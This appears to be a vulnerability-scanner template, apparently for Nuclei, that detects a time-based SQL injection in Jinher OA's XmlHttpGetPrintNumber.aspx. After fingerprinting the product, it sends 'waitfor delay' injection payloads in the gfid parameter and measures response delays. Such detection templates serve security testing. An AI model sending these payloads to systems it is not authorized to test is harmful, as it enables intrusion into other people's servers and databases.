id: poc-yaml-jinher-xmlhttpgetprintnumber-aspx-sqli
info:
  name: 金和OA XmlHttpGetPrintNumber.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  description: |
    金和OA XmlHttpGetPrintNumber.aspx is vulnerable to a SQL injection vulnerability which allows an attacker to exploit the application.

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/XmlHttpGetPrintNumber.aspx/?tid=IOA_Send&gfid=1'waitfor+delay'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/Jhsoft.Web.Archives/XmlHttpGetPrintNumber.aspx/?tid=IOA_Send&gfid=1'waitfor+delay'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0|0"
        part: body
      - type: word
        words:
          - "SessionId="
        part: header
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
